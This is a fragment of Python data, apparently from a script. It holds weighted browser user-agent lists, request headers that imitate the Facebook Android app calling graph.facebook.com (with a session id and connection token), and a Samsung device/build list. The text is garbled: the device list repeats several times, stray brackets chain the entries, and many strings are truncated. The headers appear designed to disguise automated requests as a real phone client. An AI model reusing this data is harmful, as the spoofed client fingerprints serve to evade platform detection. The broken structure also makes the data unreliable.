        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.4',
        'pct': 1.16 },
    {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.3',
        'pct': 1.16 }]
{
    'User-Agent': '[FBAN/FB4A;FBAV/21.0.0.5989;FBBV/8589659;[FBAN/FB4A;FBAV/86.0.0.19.69;FBBV/34022666;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/vodafone idea;FBMF/condor;FBBD/condor;FBPN/com.facebook.katana;FBDV/PGN605;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Host': 'graph.facebook.com',
    'X-FB-Net-HNI': '25957',
    'X-FB-SIM-HNI': '37592',
    'X-FB-Connection-Type': 'MOBILE.LTE',
    'X-Tigon-Is-Retry': 'False',
    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
    'x-fb-device-group': '5120',
    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
    'X-FB-Request-Analytics-Tags': 'graphservice',
    'X-FB-HTTP-Engine': 'Liger',
    'X-FB-Client-IP': 'True',
    'X-FB-Server-Cluster': 'True',
    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62' }
xxxx = '[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748125;FBDM/{density=1.0,width=600,height=976};FBLC/es_LA;FBCR/MOVISTAR;FBMF/Rockchip;FBBD/K5-3G;FBPN/com.facebook.katana;FBDV/K5-3G;FBSV/5.1.1;nullFBCA/x86:armeabi-v7a;]'
samsung = [
    'SM-G920F|NRD90M',
    'SM-T535|LRX22G',
    'SM-T231|KOT49H',
    'SM-J320F|LMY47V',
    'GT-I9190|KOT49H',
    'GT-N7100|KOT49H',
    'SM-T561|KTU84P',
    'GT-N7100|KOT49H',
    'GT-I9500|LRX22C',
    'SM-J320F|LMY47V',
    'SM-G930F|NRD90M',
    'SM-J320F|LMY47V',
    'SM-J510FN|NMF26X',
    'GT-P5100|IML74K',
    'SM-J320F|LMY47V',
    'GT-N8000|JZO54K',
    'SM-T531|LRX22G',
    'SPH-L720|KOT49H',
    'GT-I9500|JDQ39',
    'SM-G935F|NRD90M',
    'SM-T561|KTU84P',
    'SM-T531|KOT49H',
    'SM-J320FN|LMY47V',
    'SM-A500F|MMB29M',
    'SM-A500FU|MMB29M',
    'SM-A500F|MMB29M',
    'SM-T311|KOT49H',
    'SM-T531|LRX22G',
    'SM-J320F|LMY47V',
    'SM-J320FN|LMY47V',
    'SM-J320F|LMY47V',
    'GT-P5210|KOT49H',
    'SM-T230|KOT49H',
    'GT-I9192|KOT49H',
    'SM-T235|KOT4',
    'GT-N7100|KOT49H',
    'SM-A500F|LRX22G',
    'SM-A500F|MMB29M',
    'GT-N7100|KOT49H',
    'SM-G920F|MMB29K',
    'SM-J510FN|NMF26X',
    'GT-N8000|JZO54K',
    'SM-J320FN|LMY47V',
    'SM-J320FN|LMY47V',
    'SM-A500H|MMB29M',
    'GT-I9300|JSS15J',
    'GT-I9500|LRX22C',
    'SM-J320F|LMY4',
    'SM-J510FN|NMF26X',
    'SM-A500F|MMB29M',
    'GT-N8000|KOT49H',
    'SM-T561|KTU84P',
    'SM-G900F|KOT49H',
    'GT-S7390|JZO54K',
    'SM-J320F|LMY47V',
    'GT-P5100|JZO54K',
    'SM-A500FU|MMB29M',
    'SM-G930F|NRD90M',
    'SM-J510FN|NMF26X',
    'SM-T561|KTU84P',
    'GT-N8000|KOT49H',
    'SM-T531|LRX22G',
    'SM-J510FN|MMB29M',
    'SM-J510FN|NMF26X',
    'SM-J320F|LMY47V',
    'GT-P5110|JDQ39',
    'GT-I9301I|KOT49H',
    'SM-A500F|LRX22G',
    'SM-G930F|NRD90M',
    'SM-T311|KOT4',
    'GT-P5200|KOT49H',
    'GT-I9301I|KOT49H',
    'SM-J320M|LMY47V',
    'SM-T531|LRX22G',
    'SM-T820|NRD90M',
    'GT-I9192|KOT49H',
    'SM-G935F|MMB29K',
    'SM-J701F|NRD90M;',
    'GT-I9301I|KOT4',
    'SM-J320FN|LMY47V',
    'SM-T111|JDQ39',
    'SM-A500F|MMB29M',
    'SM-J510FN|NMF2',
    'SM-T705|LRX22G',
    'SM-G920F|NRD90M',
    'GT-N5100|JZO54K',
    'GT-I9300I|KTU84P',
    'GT-I9300I|KTU84P',
    'GT-N8000|KOT49H',
    'GT-N8000|KOT49H',
    'SM-A500F|MMB29M',
    'GT-I9190|KOT49H',
    'SM-J510FN|NMF26X',
    'SM-J320F|LMY47V',
    'GT-P5100|JDQ39',
    'GT-I9300I|KTU84P',
    'GT-N5100|JZO54K',
    'GT-N8000|KOT49H',
    'GT-I9500|LRX22C',
    'SM-J320FN|LMY47V',
    'SM-A500F|MMB29M',
    'GT-N8000|JZO54K',
    'SM-T805|LRX22G',
    'SM-T231|KOT49H',
    'GT-N5100|JZO54K',
    'SM-J320H|LMY47V',
    'SM-T231|KOT49H',
    'SM-G930F|NRD90M',
    'SM-G935F|NRD90M',
    'SM-T310|KOT49H',
    'GT-N8000|KOT49H',
    'GT-I9300I|KTU84P',
    'SM-G920F|NRD90M',
    'SM-J510FN|NMF26X',
    'SM-T705|LRX22G;',
    'GT-P3110|JZO54K',
    'GT-I9192|KOT49H',
    'SM-J320F|LMY47V',
    'SM-G920F|NRD90M',
    'GT-I9300|IMM76D',
    'SM-G950F|NRD90M',
    'SM-J320F|LMY47V',
    'SM-J510FN|NMF26X;',
    'SM-J701F|NRD90M',
    'SM-A500F|LRX22G',
    'SM-T231|KOT49H',
    'SM-T311|KOT49H',
    'SM-J320FN|LMY47V',
    'GT-P5210|KOT49H',
    'SM-T805|LRX22G',
    'GT-I9500|LRX22C',
    'GT-P5200|KOT49H',
    'GT-I9301I|KOT49H',
    'GT-I9300|JSS15J',
    'GT-N7100|KOT49H',
    'SM-T531|LRX22G',
    'SM-T820|NRD90M',
    'SM-T315|JDQ39',
    'SM-J320F|LMY47V',
    'GT-I9190|KOT49H',
    'GT-P5220|JDQ39',
    'SM-T525|KOT49H',
    'SM-T555|LRX22G',
    'GT-I9190|KOT49H',
    'SM-J510FN|NMF26X;',
    'SM-A500F|MMB29M',
    'GT-I9192|KOT49H',
    'GT-P5100|JDQ',
    'SM-T311|KOT49H']
[][{
    'ua': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.3',
    'pct': 34.01 }][{
    'ua': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.3',
    'pct': 16.33 }][{
    'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.',
    'pct': 6.8 }][{
    'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0.1 Mobile/15E148 Safari/604.',
    'pct': 5.44 }][{
    'ua': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.3',
    'pct': 5.44 }][{
    'ua': 'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3',
    'pct': 2.72 }][{
    'ua': 'Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/119.0 Firefox/119.',
    'pct': 2.72 }][{
    'ua': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
    'pct': 2.38 }][{
    'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/119.0.6045.109 Mobile/15E148 Safari/604.',
    'pct': 1.36 }][{
    'ua': 'Mozilla/5.0 (Linux; Android 11; moto e20 Build/RONS31.267-94-14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.3',
    'pct': 1.36 }][{
    'ua': 'Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G980F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.3',
    'pct': 1.36 }][{
    'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.',
    'pct': 1.36 }][{
    'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.',
    'pct': 1.36 }][{
    'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/119.0.6045.109 Mobile/15E148 Safari/604.',
    'pct': 1.36 }][{
    'ua': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.3',
    'pct': 1.36 }][{
    'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/119.0.6045.109 Mobile/15E148 Safari/604.',
    'pct': 1.36 }][{
    'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/288.0.576558892 Mobile/15E148 Safari/604.',
    'pct': 1.36 }][{
    'ua': 'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A715F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3',
    'pct': 1.36 }][{
    'ua': 'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3',
    'pct': 1.36 }][{
    'ua': 'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-M236B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.3',
    'pct': 1.36 }][{
    'ua': 'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A336B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3',
    'pct': 1.36 }][{
    'ua': 'Mozilla/5.0 (Linux; Android 10; SNE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.154 Mobile Safari/537.36 OPR/78.2.4143.7548',
    'pct': 1.36 }][{
    'ua': 'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3',
    'pct': 1.36 }][{
    'ua': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
    'pct': 0.68 }][{
    'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/288.0.576558892 Mobile/15E148 Safari/604.1',
    'pct': 0.68 }][{
    'ua': 'Mozilla/5.0 (Linux; Android 8.0; Pixel 2 Build/OPD3.170816.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Mobile Safari/537.36',
    'pct': 0.34 }][{
    'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
    'pct': 0.34 }][{
    'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.2 Mobile/15E148 Safari/604.1',
    'pct': 0.34 }][{
    'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
    'pct': 0.34 }][{
    'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0.1 Mobile/15E148 Safari/604.1',
    'pct': 0.34 }][{
    'ua': 'Mozilla/5.0 (Linux; U; Android 11; zh-cn; 21091116C Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/15.7.23',
    'pct': 0.34 }][{
    'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    'pct': 0.34 }]
samsung = [
    'SM-G920F|NRD90M',
    'SM-T535|LRX22G',
    'SM-T231|KOT49H',
    'SM-J320F|LMY47V',
    'GT-I9190|KOT49H',
    'GT-N7100|KOT49H',
    'SM-T561|KTU84P',
    'GT-N7100|KOT49H',
    'GT-I9500|LRX22C',
    'SM-J320F|LMY47V',
    'SM-G930F|NRD90M',
    'SM-J320F|LMY47V',
    'SM-J510FN|NMF26X',
    'GT-P5100|IML74K',
    'SM-J320F|LMY47V',
    'GT-N8000|JZO54K',
    'SM-T531|LRX22G',
    'SPH-L720|KOT49H',
    'GT-I9500|JDQ39',
    'SM-G935F|NRD90M',
    'SM-T561|KTU84P',
    'SM-T531|KOT49H',
    'SM-J320FN|LMY47V',
    'SM-A500F|MMB29M',
    'SM-A500FU|MMB29M',
    'SM-A500F|MMB29M',
    'SM-T311|KOT49H',
    'SM-T531|LRX22G',
    'SM-J320F|LMY47V',
    'SM-J320FN|LMY47V',
    'SM-J320F|LMY47V',
    'GT-P5210|KOT49H',
    'SM-T230|KOT49H',
    'GT-I9192|KOT49H',
    'SM-T235|KOT4',
    'GT-N7100|KOT49H',
    'SM-A500F|LRX22G',
    'SM-A500F|MMB29M',
    'GT-N7100|KOT49H',
    'SM-G920F|MMB29K',
    'SM-J510FN|NMF26X',
    'GT-N8000|JZO54K',
    'SM-J320FN|LMY47V',
    'SM-J320FN|LMY47V',
    'SM-A500H|MMB29M',
    'GT-I9300|JSS15J',
    'GT-I9500|LRX22C',
    'SM-J320F|LMY4',
    'SM-J510FN|NMF26X',
    'SM-A500F|MMB29M',
    'GT-N8000|KOT49H',
    'SM-T561|KTU84P',
    'SM-G900F|KOT49H',
    'GT-S7390|JZO54K',
    'SM-J320F|LMY47V',
    'GT-P5100|JZO54K',
    'SM-A500FU|MMB29M',
    'SM-G930F|NRD90M',
    'SM-J510FN|NMF26X',
    'SM-T561|KTU84P',
    'GT-N8000|KOT49H',
    'SM-T531|LRX22G',
    'SM-J510FN|MMB29M',
    'SM-J510FN|NMF26X',
    'SM-J320F|LMY47V',
    'GT-P5110|JDQ39',
    'GT-I9301I|KOT49H',
    'SM-A500F|LRX22G',
    'SM-G930F|NRD90M',
    'SM-T311|KOT4',
    'GT-P5200|KOT49H',
    'GT-I9301I|KOT49H',
    'SM-J320M|LMY47V',
    'SM-T531|LRX22G',
    'SM-T820|NRD90M',
    'GT-I9192|KOT49H',
    'SM-G935F|MMB29K',
    'SM-J701F|NRD90M;',
    'GT-I9301I|KOT4',
    'SM-J320FN|LMY47V',
    'SM-T111|JDQ39',
    'SM-A500F|MMB29M',
    'SM-J510FN|NMF2',
    'SM-T705|LRX22G',
    'SM-G920F|NRD90M',
    'GT-N5100|JZO54K',
    'GT-I9300I|KTU84P',
    'GT-I9300I|KTU84P',
    'GT-N8000|KOT49H',
    'GT-N8000|KOT49H',
    'SM-A500F|MMB29M',
    'GT-I9190|KOT49H',
    'SM-J510FN|NMF26X',
    'SM-J320F|LMY47V',
    'GT-P5100|JDQ39',
    'GT-I9300I|KTU84P',
    'GT-N5100|JZO54K',
    'GT-N8000|KOT49H',
    'GT-I9500|LRX22C',
    'SM-J320FN|LMY47V',
    'SM-A500F|MMB29M',
    'GT-N8000|JZO54K',
    'SM-T805|LRX22G',
    'SM-T231|KOT49H',
    'GT-N5100|JZO54K',
    'SM-J320H|LMY47V',
    'SM-T231|KOT49H',
    'SM-G930F|NRD90M',
    'SM-G935F|NRD90M',
    'SM-T310|KOT49H',
    'GT-N8000|KOT49H',
    'GT-I9300I|KTU84P',
    'SM-G920F|NRD90M',
    'SM-J510FN|NMF26X',
    'SM-T705|LRX22G;',
    'GT-P3110|JZO54K',
    'GT-I9192|KOT49H',
    'SM-J320F|LMY47V',
    'SM-G920F|NRD90M',
    'GT-I9300|IMM76D',
    'SM-G950F|NRD90M',
    'SM-J320F|LMY47V',
    'SM-J510FN|NMF26X;',
    'SM-J701F|NRD90M',
    'SM-A500F|LRX22G',
    'SM-T231|KOT49H',
    'SM-T311|KOT49H',
    'SM-J320FN|LMY47V',
    'GT-P5210|KOT49H',
    'SM-T805|LRX22G',
    'GT-I9500|LRX22C',
    'GT-P5200|KOT49H',
    'GT-I9301I|KOT49H',
    'GT-I9300|JSS15J',
    'GT-N7100|KOT49H',
    'SM-T531|LRX22G',
    'SM-T820|NRD90M',
    'SM-T315|JDQ39',
    'SM-J320F|LMY47V',
    'GT-I9190|KOT49H',
    'GT-P5220|JDQ39',
    'SM-T525|KOT49H',
    'SM-T555|LRX22G',
    'GT-I9190|KOT49H',
    'SM-J510FN|NMF26X;',
    'SM-A500F|MMB29M',
    'GT-I9192|KOT49H',
    'GT-P5100|JDQ',
    'SM-T311|KOT49H']
samsung = [
    'SM-G920F|NRD90M',
    'SM-T535|LRX22G',
    'SM-T231|KOT49H',
    'SM-J320F|LMY47V',
    'GT-I9190|KOT49H',
    'GT-N7100|KOT49H',
    'SM-T561|KTU84P',
    'GT-N7100|KOT49H',
    'GT-I9500|LRX22C',
    'SM-J320F|LMY47V',
    'SM-G930F|NRD90M',
    'SM-J320F|LMY47V',
    'SM-J510FN|NMF26X',
    'GT-P5100|IML74K',
    'SM-J320F|LMY47V',
    'GT-N8000|JZO54K',
    'SM-T531|LRX22G',
    'SPH-L720|KOT49H',
    'GT-I9500|JDQ39',
    'SM-G935F|NRD90M',
    'SM-T561|KTU84P',
    'SM-T531|KOT49H',
    'SM-J320FN|LMY47V',
    'SM-A500F|MMB29M',
    'SM-A500FU|MMB29M',
    'SM-A500F|MMB29M',
    'SM-T311|KOT49H',
    'SM-T531|LRX22G',
    'SM-J320F|LMY47V',
    'SM-J320FN|LMY47V',
    'SM-J320F|LMY47V',
    'GT-P5210|KOT49H',
    'SM-T230|KOT49H',
    'GT-I9192|KOT49H',
    'SM-T235|KOT4',
    'GT-N7100|KOT49H',
    'SM-A500F|LRX22G',
    'SM-A500F|MMB29M',
    'GT-N7100|KOT49H',
    'SM-G920F|MMB29K',
    'SM-J510FN|NMF26X',
    'GT-N8000|JZO54K',
    'SM-J320FN|LMY47V',
    'SM-J320FN|LMY47V',
    'SM-A500H|MMB29M',
    'GT-I9300|JSS15J',
    'GT-I9500|LRX22C',
    'SM-J320F|LMY4',
    'SM-J510FN|NMF26X',
    'SM-A500F|MMB29M',
    'GT-N8000|KOT49H',
    'SM-T561|KTU84P',
    'SM-G900F|KOT49H',
    'GT-S7390|JZO54K',
    'SM-J320F|LMY47V',
    'GT-P5100|JZO54K',
    'SM-A500FU|MMB29M',
    'SM-G930F|NRD90M',
    'SM-J510FN|NMF26X',
    'SM-T561|KTU84P',
    'GT-N8000|KOT49H',
    'SM-T531|LRX22G',
    'SM-J510FN|MMB29M',
    'SM-J510FN|NMF26X',
    'SM-J320F|LMY47V',
    'GT-P5110|JDQ39',
    'GT-I9301I|KOT49H',
    'SM-A500F|LRX22G',
    'SM-G930F|NRD90M',
    'SM-T311|KOT4',
    'GT-P5200|KOT49H',
    'GT-I9301I|KOT49H',
    'SM-J320M|LMY47V',
    'SM-T531|LRX22G',
    'SM-T820|NRD90M',
    'GT-I9192|KOT49H',
    'SM-G935F|MMB29K',
    'SM-J701F|NRD90M;',
    'GT-I9301I|KOT4',
    'SM-J320FN|LMY47V',
    'SM-T111|JDQ39',
    'SM-A500F|MMB29M',
    'SM-J510FN|NMF2',
    'SM-T705|LRX22G',
    'SM-G920F|NRD90M',
    'GT-N5100|JZO54K',
    'GT-I9300I|KTU84P',
    'GT-I9300I|KTU84P',
    'GT-N8000|KOT49H',
    'GT-N8000|KOT49H',
    'SM-A500F|MMB29M',
    'GT-I9190|KOT49H',
    'SM-J510FN|NMF26X',
    'SM-J320F|LMY47V',
    'GT-P5100|JDQ39',
    'GT-I9300I|KTU84P',
    'GT-N5100|JZO54K',
    'GT-N8000|KOT49H',
    'GT-I9500|LRX22C',
    'SM-J320FN|LMY47V',
    'SM-A500F|MMB29M',
    'GT-N8000|JZO54K',
    'SM-T805|LRX22G',
    'SM-T231|KOT49H',
    'GT-N5100|JZO54K',
    'SM-J320H|LMY47V',
    'SM-T231|KOT49H',
    'SM-G930F|NRD90M',
    'SM-G935F|NRD90M',
    'SM-T310|KOT49H',
    'GT-N8000|KOT49H',
    'GT-I9300I|KTU84P',
    'SM-G920F|NRD90M',
    'SM-J510FN|NMF26X',
    'SM-T705|LRX22G;',
    'GT-P3110|JZO54K',
    'GT-I9192|KOT49H',
    'SM-J320F|LMY47V',
    'SM-G920F|NRD90M',
    'GT-I9300|IMM76D',
    'SM-G950F|NRD90M',
    'SM-J320F|LMY47V',
    'SM-J510FN|NMF26X;',
    'SM-J701F|NRD90M',
    'SM-A500F|LRX22G',
    'SM-T231|KOT49H',
    'SM-T311|KOT49H',
    'SM-J320FN|LMY47V',
    'GT-P5210|KOT49H',
    'SM-T805|LRX22G',
    'GT-I9500|LRX22C',
    'GT-P5200|KOT49H',
    'GT-I9301I|KOT49H',
    'GT-I9300|JSS15J',
    'GT-N7100|KOT49H',
    'SM-T531|LRX22G',
    'SM-T820|NRD90M',
    'SM-T315|JDQ39',
    'SM-J320F|LMY47V',
    'GT-I9190|KOT49H',
    'GT-P5220|JDQ39',
    'SM-T525|KOT49H',
    'SM-T555|LRX22G',
    'GT-I9190|KOT49H',
    'SM-J510FN|NMF26X;',
    'SM-A500F|MMB29M',
    'GT-I9192|KOT49H',
    'GT-P5100|JDQ',
    'SM-T311|KOT49H']
samsung = [
    'SM-G920F|NRD90M',
    'SM-T535|LRX22G',
    'SM-T231|KOT49H',
    'SM-J320F|LMY47V',
    'GT-I9190|KOT49H',
    'GT-N7100|KOT49H',
    'SM-T561|KTU84P',
    'GT-N7100|KOT49H',
    'GT-I9500|LRX22C',
    'SM-J320F|LMY47V',
    'SM-G930F|NRD90M',
    'SM-J320F|LMY47V',
    'SM-J510FN|NMF26X',
    'GT-P5100|IML74K',
    'SM-J320F|LMY47V',
    'GT-N8000|JZO54K',
    'SM-T531|LRX22G',
    'SPH-L720|KOT49H',
    'GT-I9500|JDQ39',
    'SM-G935F|NRD90M',
    'SM-T561|KTU84P',
    'SM-T531|KOT49H',
    'SM-J320FN|LMY47V',
    'SM-A500F|MMB29M',
    'SM-A500FU|MMB29M',
    'SM-A500F|MMB29M',
    'SM-T311|KOT49H',
    'SM-T531|LRX22G',
    'SM-J320F|LMY47V',
    'SM-J320FN|LMY47V',
    'SM-J320F|LMY47V',
    'GT-P5210|KOT49H',
    'SM-T230|KOT49H',
    'GT-I9192|KOT49H',
    'SM-T235|KOT4',
    'GT-N7100|KOT49H',
    'SM-A500F|LRX22G',
    'SM-A500F|MMB29M',
    'GT-N7100|KOT49H',
    'SM-G920F|MMB29K',
    'SM-J510FN|NMF26X',
    'GT-N8000|JZO54K',
    'SM-J320FN|LMY47V',
    'SM-J320FN|LMY47V',
    'SM-A500H|MMB29M',
    'GT-I9300|JSS15J',
    'GT-I9500|LRX22C',
    'SM-J320F|LMY4',
    'SM-J510FN|NMF26X',
    'SM-A500F|MMB29M',
    'GT-N8000|KOT49H',
    'SM-T561|KTU84P',
    'SM-G900F|KOT49H',
    'GT-S7390|JZO54K',
    'SM-J320F|LMY47V',
    'GT-P5100|JZO54K',
    'SM-A500FU|MMB29M',
    'SM-G930F|NRD90M',
    'SM-J510FN|NMF26X',
    'SM-T561|KTU84P',
    'GT-N8000|KOT49H',
    'SM-T531|LRX22G',
    'SM-J510FN|MMB29M',
    'SM-J510FN|NMF26X',
    'SM-J320F|LMY47V',
    'GT-P5110|JDQ39',
    'GT-I9301I|KOT49H',
    'SM-A500F|LRX22G',
    'SM-G930F|NRD90M',
    'SM-T311|KOT4',
    'GT-P5200|KOT49H',
    'GT-I9301I|KOT49H',
    'SM-J320M|LMY47V',
    'SM-T531|LRX22G',
    'SM-T820|NRD90M',
    'GT-I9192|KOT49H',
    'SM-G935F|MMB29K',
    'SM-J701F|NRD90M;',
    'GT-I9301I|KOT4',
    'SM-J320FN|LMY47V',
    'SM-T111|JDQ39',
    'SM-A500F|MMB29M',
    'SM-J510FN|NMF2',
    'SM-T705|LRX22G',
    'SM-G920F|NRD90M',
    'GT-N5100|JZO54K',
    'GT-I9300I|KTU84P',
    'GT-I9300I|KTU84P',
    'GT-N8000|KOT49H',
    'GT-N8000|KOT49H',
    'SM-A500F|MMB29M',
    'GT-I9190|KOT49H',
    'SM-J510FN|NMF26X',
    'SM-J320F|LMY47V',
    'GT-P5100|JDQ39',
    'GT-I9300I|KTU84P',
    'GT-N5100|JZO54K',
    'GT-N8000|KOT49H',
    'GT-I9500|LRX22C',
    'SM-J320FN|LMY47V',
    'SM-A500F|MMB29M',
    'GT-N8000|JZO54K',
    'SM-T805|LRX22G',
    'SM-T231|KOT49H',
    'GT-N5100|JZO54K',
    'SM-J320H|LMY47V',
    'SM-T231|KOT49H',
    'SM-G930F|NRD90M',
    'SM-G935F|NRD90M',
    'SM-T310|KOT49H',
    'GT-N8000|KOT49H',
    'GT-I9300I|KTU84P',
    'SM-G920F|NRD90M',
    'SM-J510FN|NMF26X',
    'SM-T705|LRX22G;',
    'GT-P3110|JZO54K',
    'GT-I9192|KOT49H',
    'SM-J320F|LMY47V',
    'SM-G920F|NRD90M',
    'GT-I9300|IMM76D',
    'SM-G950F|NRD90M',
    'SM-J320F|LMY47V',
    'SM-J510FN|NMF26X;',
    'SM-J701F|NRD90M',
    'SM-A500F|LRX22G',
    'SM-T231|KOT49H',
    'SM-T311|KOT49H',
    'SM-J320FN|LMY47V',
    'GT-P5210|KOT49H',
    'SM-T805|LRX22G',
    'GT-I9500|LRX22C',
    'GT-P5200|KOT49H',
    'GT-I9301I|KOT49H',
    'GT-I9300|JSS15J',
    'GT-N7100|KOT49H',
    'SM-T531|LRX22G',
    'SM-T820|NRD90M',
    'SM-T315|JDQ39',
    'SM-J320F|LMY47V',
    'GT-I9190|KOT49H',
    'GT-P5220|JDQ39',
    'SM-T525|KOT49H',
    'SM-T555|LRX22G',
    'GT-I9190|KOT49H',
    'SM-J510FN|NMF26X;',
    'SM-A500F|MMB29M',
    'GT-I9192|KOT49H',
    'GT-P5100|JDQ',
    'SM-T311|KOT49H']
samsung = [
    'SM-G920F|NRD90M',
    'SM-T535|LRX22G',
    'SM-T231|KOT49H',
    'SM-J320F|LMY47V',
    'GT-I9190|KOT49H',
    'GT-N7100|KOT49H',
    'SM-T561|KTU84P',
    'GT-N7100|KOT49H',
    'GT-I9500|LRX22C',
    'SM-J320F|LMY47V',
    'SM-G930F|NRD90M',
    'SM-J320F|LMY47V',
    'SM-J510FN|NMF26X',
    'GT-P5100|IML74K',
    'SM-J320F|LMY47V',
    'GT-N8000|JZO54K',
    'SM-T531|LRX22G',
    'SPH-L720|KOT49H',
    'GT-I9500|JDQ39',
    'SM-G935F|NRD90M',
    'SM-T561|KTU84P',
    'SM-T531|KOT49H',
    'SM-J320FN|LMY47V',
    'SM-A500F|MMB29M',
    'SM-A500FU|MMB29M',
    'SM-A500F|MMB29M',
    'SM-T311|KOT49H',
    'SM-T531|LRX22G',
    'SM-J320F|LMY47V',
    'SM-J320FN|LMY47V',
    'SM-J320F|LMY47V',
    'GT-P5210|KOT49H',
    'SM-T230|KOT49H',
    'GT-I9192|KOT49H',
    'SM-T235|KOT4',
    'GT-N7100|KOT49H',
    'SM-A500F|LRX22G',
    'SM-A500F|MMB29M',
    'GT-N7100|KOT49H',
    'SM-G920F|MMB29K',
    'SM-J510FN|NMF26X',
    'GT-N8000|JZO54K',
    'SM-J320FN|LMY47V',
    'SM-J320FN|LMY47V',
    'SM-A500H|MMB29M',
    'GT-I9300|JSS15J',
    'GT-I9500|LRX22C',
    'SM-J320F|LMY4',
    'SM-J510FN|NMF26X',
    'SM-A500F|MMB29M',
    'GT-N8000|KOT49H',
    'SM-T561|KTU84P',
    'SM-G900F|KOT49H',
    'GT-S7390|JZO54K',
    'SM-J320F|LMY47V',
    'GT-P5100|JZO54K',
    'SM-A500FU|MMB29M',
    'SM-G930F|NRD90M',
    'SM-J510FN|NMF26X',
    'SM-T561|KTU84P',
    'GT-N8000|KOT49H',
    'SM-T531|LRX22G',
